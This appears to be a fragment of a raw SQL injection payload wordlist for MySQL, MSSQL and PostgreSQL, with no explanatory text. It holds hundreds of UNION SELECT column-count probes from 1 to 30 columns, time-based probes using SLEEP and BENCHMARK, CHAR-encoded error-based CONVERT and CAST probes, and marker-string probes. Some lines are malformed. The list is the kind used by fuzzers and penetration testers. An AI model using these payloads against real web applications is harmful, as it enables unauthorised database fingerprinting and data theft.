@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION SELECT @@VERSION,SLEEP(5),&quot;'3\n UNION SELECT @@VERSION,SLEEP(5),&quot;'3'&quot;#\n UNION SELECT @@VERSION,SLEEP(5),USER(),4#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\n UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\n UNION ALL SELECT USER()-- \n UNION ALL SELECT SLEEP(5)-- \n UNION ALL SELECT USER(),SLEEP(5)-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n UNION ALL SELECT NULL-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- \n UNION ALL SELECT NULL#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#\n UNION ALL SELECT NULL \n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))\n AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\n AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\n AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)\n AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\n UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX'\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\n UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- \n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- \n 